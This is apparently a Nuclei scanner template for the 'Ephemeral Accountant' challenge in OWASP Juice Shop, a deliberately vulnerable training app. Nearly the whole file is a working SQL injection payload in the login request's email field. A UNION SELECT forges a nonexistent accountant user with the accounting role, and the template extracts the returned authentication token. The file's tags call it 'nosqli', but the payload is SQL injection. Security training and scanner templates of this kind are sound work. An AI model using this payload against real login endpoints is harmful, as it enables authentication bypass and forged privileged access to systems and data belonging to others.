id: juice-shop-ephemeral-accountant

info:
  name: Ephemeral Accountant
  author: yelaco
  severity: high
  tags: juice-shop,nosqli,login
  description: Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user

requests:
  - method: POST
    path:
      - "{{BaseURL}}/rest/user/login"

    headers:
      Content-Type: application/json

    body: |
      {
        "email": "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--",
        "password": "irrelevant"
      }

    matchers:
      - type: word
        part: body
        words:
          - "authentication"
          - "token"
        condition: and

    extractors:
      - type: json
        json:
          - ".authentication.token"
